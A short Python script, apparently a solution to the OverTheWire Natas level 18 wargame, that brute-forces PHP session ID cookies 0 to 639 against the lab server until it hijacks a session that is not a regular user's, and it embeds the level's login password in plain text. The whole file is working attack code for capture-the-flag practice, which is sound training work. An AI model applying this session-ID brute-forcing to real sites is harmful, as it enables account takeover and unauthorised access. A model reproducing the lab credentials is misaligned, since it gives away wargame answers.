# Overthewire: Natas 18
# woanmeo11

import requests


url = 'http://natas18.natas.labs.overthewire.org/'
account = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(640):
    print(i, end=': ', flush=True)
    r = requests.post(url, auth=account, data={'a': 'a'}, cookies=dict(PHPSESSID = str(i)))
    if 'regular user' in r.text:
        print('fail')
    else:
        print('ok')
        print(r.text)
        break
